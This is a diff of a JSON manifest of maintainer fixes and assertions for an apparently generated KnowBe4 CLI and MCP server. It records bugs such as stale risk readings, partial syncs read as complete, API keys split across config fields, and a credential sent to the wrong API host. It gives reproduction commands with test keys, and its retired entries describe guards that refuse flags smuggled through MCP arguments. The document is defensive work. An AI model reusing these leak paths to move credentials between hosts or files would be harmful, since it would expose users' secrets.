+     "file": "cli/internal/insights/knowbe4_kb4_r1_test.go",
+     "contains": "func TestRecipientWalkStoppedAtItsBoundIsAFailure(t *testing.T) {",
+     "code_only": true
     }
    ]
   },
@@ -554,6 +941,567 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "r2-missing-input-read-as-zero",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "Every novel and insight reads a collection as complete only through one predicate, insights.CollectionSynced: the collection's own sync completion record (sync_state last_attempt_complete = 1, written only by a list walk that finished), never a row in its table. The phishing-test recipient walk keeps its own record (pst-recipients), set only when every test was walked over a completely synced set of tests and no later tests sync finished after it. freshness readiness, the QBR training completion share and the risk-leaderboard counts use the same predicate; `workflow archive --full` clears cursors without recording a completed sync (SaveSyncCursor, not SaveSyncState).",
+   "why": "One cached detail row was proof the whole collection was synced: after `training-enrollments get 1` (Bob's enrollment) and `sync --resources users,phishing-tests`, untrained-clickers listed Alice as untrained although her enrollment (status Passed) was never fetched; the same row made coverage-gaps, risk-leaderboard open_trainings, the QBR completion share and freshness readiness answer. A partial recipient walk (one test failed) was read as every recipient, and `workflow archive --full` wrote a completed record for every resource before walking any, so an archive stopped at its first resource left users and enrollments synced and empty (coverage-gaps answered no gaps). Codex review round 2 (knowbe4 4.34.2 reprint). Seen failing then passing: .review/seen-missing-input-read-as-zero.log (TestR2OneCachedRowIsNotASyncedCollection, TestR2FullArchiveRecordsNoSyncItDidNotFinish).",
+   "asserts": [
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "func CollectionSynced(ctx context.Context, db *sql.DB, resource string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "return CollectionSynced(ctx, db, RecipientsResource)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "if !pok || at.IsZero() || pat.IsZero() || pat.After(at) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "not_contains": "func inputHeld("
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "not_contains": "hasRows(ctx, db, \"pst_recipients\")"
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "if !enrollmentsHeld(ctx, db) {\n\t\treturn 0, notSynced(enrollmentsInput, enrollmentsSrc)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "if walk.Failed == 0 && testsComplete {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "if err := recordRecipientWalk(ctx, db, false, 0); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/readiness.go",
+     "contains": "held[rt] = CollectionSynced(ctx, db, rt)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/readiness.go",
+     "contains": "if !held[t] {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/channel_workflow.go",
+     "contains": "if err := s.SaveSyncCursor(resource, \"\"); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/channel_workflow.go",
+     "not_contains": "s.SaveSyncState(resource, \"\", 0)"
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2OneCachedRowIsNotASyncedCollection(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2FullArchiveRecordsNoSyncItDidNotFinish(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2CollectionSyncedNeedsItsOwnFinishedWalk(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2RecipientWalkRecordsOnlyAFinishedWalk(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r2-stale-source-preferred",
+   "class": "wrong-result",
+   "status": "active",
+   "summary": "A value the local store holds in two places is read through one helper, insights.newer (over insights.newestReading): the reading taken from the API more recently wins, whichever source holds it. The QBR account risk score compares the account risk snapshots with the account table (an `account info` row); group-risk-contribution weights each group by the newer of the groups table's and its snapshots' member_count, null (never 0 or 1) when neither holds one. SnapshotRisk stamps each copied row with the time the row was read (its synced_at), never the sync's time, and puts every account reading on one series (AccountEntityID); risk-drift reads the account as one series and names an entity from its newest reading. Because snapshots carry each row's own read time, drift's input is counted per entity (driftHeld: some entity read at two different times), never across entities, in risk-drift, group-risk-contribution and freshness readiness.",
+   "why": "QBR always preferred the account snapshot over the account table without comparing freshness: after `sync` read current_risk_score 65 and a later `account info` stored 90, `qbr` reported 65. The sync also copied the stored account row into a snapshot stamped with the sync's own time, so after a later sync read 70 the copy of the older 90 tied with it and QBR reported 90. group-risk-contribution read a group missing from the groups table as 0 members although its snapshots carried member_count 50. Codex review round 2 (knowbe4 4.34.2 reprint). Seen failing then passing: .review/seen-stale-source-preferred.log (TestR2QBRReadsTheNewerAccountReading, TestR2GroupWeightReadsTheNewerMemberCount, TestR2AccountScoreReadsTheNewerSource). Follow-up in the same class: once snapshots carried each row's read time, one `sync --resources users` left the users and the account at two different snapshot times, and the store-wide distinct-time count let risk-drift answer [] (nothing moved) with no entity read twice (TestNoNovelReadsAMissingInputAsNone, TestR2DriftNeedsOneEntityReadTwice; same log).",
+   "asserts": [
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "func newer[T any](a, b stamped[T]) stamped[T] {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "func newestReading[T any](ctx context.Context, db *sql.DB, query string, args ...any) stamped[T] {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "r := newer(\n\t\tnewestReading[float64](ctx, db, `SELECT risk_score, CAST(snapshot_at AS TEXT) FROM \"risk_snapshots\" WHERE entity_type = 'account' AND risk_score IS NOT NULL`),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "newestReading[int](ctx, db, `SELECT member_count, CAST(synced_at AS TEXT) FROM \"groups\" WHERE id = ? AND member_count IS NOT NULL`, d.EntityID),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "not_contains": "ORDER BY snapshot_at DESC LIMIT 1"
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "not_contains": "members[d.EntityID]"
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "if et == \"account\" {\n\t\t\tid = AccountEntityID",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "if _, err := ins.ExecContext(ctx, kind, id.String, name.String, sc, mc, read.UTC().Format(\"2006-01-02T15:04:05.000Z\")); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/insights.go",
+     "contains": "func SnapshotRisk(ctx context.Context, db *sql.DB) (int, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2QBRReadsTheNewerAccountReading(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2GroupWeightReadsTheNewerMemberCount(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2AccountScoreReadsTheNewerSource(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "func driftHeld(ctx context.Context, db *sql.DB, entityType string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "tq += ` GROUP BY entity_type, CASE WHEN entity_type = 'account' THEN '' ELSE entity_id END)`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/queries.go",
+     "contains": "if !driftHeld(ctx, db, entityType) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/readiness.go",
+     "contains": "!driftHeld(ctx, db, \"group\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/insights/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2DriftNeedsOneEntityReadTwice(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r2-persistence-gate-skipped-under-agentcookie",
+   "class": "secret-persisted",
+   "status": "active",
+   "summary": "Every config.toml write is judged whole by one combined check, persistedEchoesCredential: every field the write persists, header values included, marshaled as save() writes it, against every credential the configuration carries (persistGateCredentials: configCredentialValues plus ReportingCredentials, so the base URL's userinfo password and credential-named header values count too). The agentcookie-managed path runs it on every write and refuses; the unmanaged path drops every header when it fails. Header values alone are judged by the same set (headerHoldsCredential).",
+   "why": "Under the .agentcookie-managed marker, refuseCredentialInConfigFile checked each header value alone and then left the headers out of the combined check, so a held key split between a header value and another non-credential field was written: a marked 0600 config.toml with [headers] X-Tail=\"ujmikolp0987654321\" and `KNOWBE4_API_KEY=<the 36-character test value> KNOWBE4_REGION=qazwsxedcrfvtgbyhn knowbe4-cli --config <it> auth set-token` wrote the key's prefix into template_vars.region beside its suffix. Unmanaged, a header repeating the base_url userinfo password was kept, because the header check's set held no URL credentials. Codex review round 2 (knowbe4 4.34.2 reprint). Seen failing then passing: .review/seen-persistence-gate-skipped-under-agentcookie.log (TestR2ConfigWriteJudgesEveryFieldTogether, TestR2AuthSetTokenUnderAgentcookieWritesNoSplitKey).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "func persistedEchoesCredential(p persistedConfig, creds []string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "return append(configCredentialValues(c), ReportingCredentials(c)...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "creds := persistGateCredentials(&cfg)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "if persistedEchoesCredential(p, creds) {\n\t\t\treturn ErrConfigHoldsCredential",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "contains": "if len(p.Headers) > 0 && persistedEchoesCredential(p, creds) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_persist.go",
+     "not_contains": "creds := configCredentialValues(&cfg)"
+    },
+    {
+     "file": "cli/internal/config/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2ConfigWriteJudgesEveryFieldTogether(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2AuthSetTokenUnderAgentcookieWritesNoSplitKey(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "r2-credential-to-other-api-host",
+   "class": "auth-wire",
+   "status": "active",
+   "summary": "The same-key exemption of the Reporting client's foreign set reads only the credential that client actually sends, config.SentReportingCredentials (the Authorization header AuthHeader builds from the effective configuration, whole and without its scheme word, and the key or token it is built from): the effective User Event key is foreign to the Reporting host unless it is that sent credential, never because a configuration layer an environment value overrode also holds it. The User Event client's exemption stays its own effective KNOWBE4_USER_EVENT_API_KEY, and every Reporting credential (effective key, URL credentials, every layer) stays foreign to the User Event host.",
+   "why": "guardClient built the Reporting foreign set as otherThan(userEventCredentials(), ReportingCredentials(c.Config)), and ReportingCredentials walks every configuration layer: with a 0600 config file holding api_key=\"EventSecret-8d31\", `KNOWBE4_API_KEY=ReportingSecret-7c92 KNOWBE4_USER_EVENT_API_KEY=EventSecret-8d31 knowbe4-cli --config <it> users list --status EventSecret-8d31` sent the User Event key to the Reporting host, because the overridden file value exempted it. Codex review round 2 (knowbe4 4.34.2 reprint), instance 1 only; the unparseable base_url password instance is classified non-blocking. Seen failing then passing: .review/seen-credential-to-other-api-host.log (TestR2EventKeyIsForeignUnlessItIsTheSentReportingKey).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/knowbe4_hold.go",
+     "contains": "func SentReportingCredentials(c *Config) []string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "contains": "refuseOtherAPICredentials(c.HTTPClient, otherThan(userEventCredentials(), config.SentReportingCredentials(c.Config)))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_guard.go",
+     "not_contains": "otherThan(userEventCredentials(), config.ReportingCredentials(c.Config))"
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_userevents_guard.go",
+     "contains": "refuseOtherAPICredentials(c.HTTP, otherThan(config.ReportingCredentials(cfg), userEventCredentials()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2EventKeyIsForeignUnlessItIsTheSentReportingKey(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_codex_r2_test.go",
+     "contains": "func TestR2SentReportingCredentialsAreTheEffectiveKey(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credkit",
+   "status": "active",
+   "summary": "The shared credential kit (internal/credkit, vendored) is wired by hand: one credkit.Declarations literal in internal/credwire/declarations.go, credkit.Start(credwire.Declarations) first in both mains and credkit.Exit at the end, and every sink routed through the kit (Reporting and User Event transports, file writes, the SQLite driver internal/credsql, the MCP server stdio, HTTP and tool results, child processes, the terminal check). The SQLite driver sets the MCP sql tool's value cap as each connection opens (sqlite.Limit cannot reach a kit-wrapped connection), and the read-only opens run \"select 1\" where they pinged (the kit's connection does not forward Ping).",
+   "why": "A reprint regenerates the mains, the client, the store and the MCP server in their press form, which routes nothing through the kit: every credential would print, persist and travel unchecked. The kit replaces the connector's own credential layer; the entries it retired (replaced by the shared credential kit) are: secret-echo-decoded-funnel, output-chokepoint, file-sinks-withheld, store-never-keeps-secrets, mcp-protocol-messages-withheld, network-sinks-withheld, startup-output-held-first, mcp-held-arguments-refused, undecoded-encodings-every-alignment, held-forms-in-every-encoding, response-credentials-held, every-text-encoding-withheld, outbound-split-parts-refused, auth-carrier-names-and-shapes-held, secure-container-is-credential, r1-holder-reads-every-part, r1-mixed-byte-escapes-decoded, r1-split-across-deliveries-withheld, held-value-case-folded, output-units-reassembled, preclose-holder-numbers-and-cookies, preclose-escape-fixpoint, preclose-split-across-processes-and-protocol, refuse-held-uses-connector-chokepoint, output-derived-and-scheme-forms-matched-whole, r1-short-value-encodings-withheld, r1-file-history-is-the-whole-file, r2-short-value-nested-encodings, startup-error-lost, r1-credential-split-across-deliveries, r1-decoder-bound-read-as-no-echo, credential-named-by-sibling-member, r1-credential-pair-identity-unheld, r1-command-line-config-unheld-at-startup, r1-short-held-value-inside-other-text, r1-secret-in-headerless-compressed-stream, r1-unreadable-history-read-as-empty, r1-check-then-append-not-serialized, spec-credential-under-a-generic-name, r1-mask-shaped-credential, r2-whitespace-credential, knowbe4-credential-names-exact, bb-whitespace-query-credential, r1-non-text-sql-binding-unheld.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "{Source: \"env:KNOWBE4_USER_EVENT_API_KEY\", Allowed: userEventOrigins()},",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-mcp/main.go",
+     "contains": "server.NewStdioServer(s).Listen(ctx, credkit.MCPIn(os.Stdin), credkit.MCPOut())",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-mcp/main.go",
+     "contains": "kit := credkit.MCPHTTP(http.HandlerFunc(",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-mcp/main.go",
+     "contains": "for _, key := range credkit.FlagValues(os.Args[1:], \"--tls-key\") {",
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/knowbe4-mcp/knowbe4_tls_key_hold.go",
+     "contains": "credkit.Hold(\"minted:tls-key\", append(body, strings.Join(body, \"\"))...)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(cappedSQLite()))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver, dsn)",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "probe, err := sql.Open(credsql.Driver, \"file:\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver, ",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "var HoldCredential = credkit.Hold",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "return guardedTransport{RoundTripper: cliutil.OutboundGuard(tr), inner: tr}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "httpClient.Transport = guardTransport(tr)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.Transport = guardTransport(tr)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "cliutil.HoldCredential(\"minted:authorization\", authHeader)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "_ = credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/userevents/userevents.go",
+     "contains": "HTTP:    &http.Client{Timeout: timeout, Transport: cliutil.OutboundGuard(nil)},",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "Transport: cliutil.OutboundGuard(nil),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "if err := credkit.WriteFile(tmp, body, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "client := &http.Client{Timeout: 15 * time.Second, Transport: cliutil.OutboundGuard(nil)}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "f, err := credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: OutboundGuard(nil)}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "outKit = credkit.NewWriter(f, credkit.SinkFile)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "if err := credkit.WriteFile(tmp, data, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "f, err := credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "f, err := credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "if err := credkit.WriteFile(tmpName, data, 0o600); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "err := credkit.RunCommand(cmd)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "return credkit.StartCommand(c)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "cliutil.HoldCredential(\"stdin\", token)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/knowbe4_hold.go",
+     "contains": "_, err := credkit.NewWriter(&buf, credkit.SinkFile).Write(b)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/knowbe4_argv_test.go",
+     "contains": "func TestChildArgvNeverRepeatsAHeldValue(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "d.RegisterConnectionHook(applyLengthLimit)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(dbPath string, maxValueBytes int) (*Store, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "dsn += \"&\" + credsql.LengthLimitParam + \"=\" + strconv.Itoa(maxValueBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if _, err := db.ExecContext(ctx, \"select 1\"); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "if _, err := source.ExecContext(ctx, \"select 1\"); err != nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "db, toolErr := openMCPReadOnlyStore(path, mcpSQLMaxValueBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "db, err := store.OpenReadOnlyValueCapped(path, maxValueBytes)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "sqlite.Limit(conn,"
+    },
+    {
+     "file": "cli/internal/cli/knowbe4_events_kit_test.go",
+     "contains": "func TestEventsRefuseAPieceOrEncodingOfTheReportingKey(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "outLines = &lineUnits{w: outKit}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "func (l *lineUnits) Write(p []byte) (int, error) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "gitleaks-generated-selector-allowed",
+   "status": "active",
+   "class": "secret-scan-false-positive",
+   "summary": "The generated credentials merge line `c.Knowbe4ApiKey = creds.Knowbe4ApiKey` carries a gitleaks:allow comment",
+   "why": "gitleaks 8.18.4 (CI's pinned version) reads the selector creds.Knowbe4ApiKey after an ApiKey assignment as a generic API key: the digit in the vendor name lifts its entropy over the rule's floor, where siblings such as creds.AuvikApiKey stay under it. It is a struct field copy, not a literal, so the line is allowed in place rather than the whole rule widened.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "c.Knowbe4ApiKey = creds.Knowbe4ApiKey // gitleaks:allow",
+     "code_only": false
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
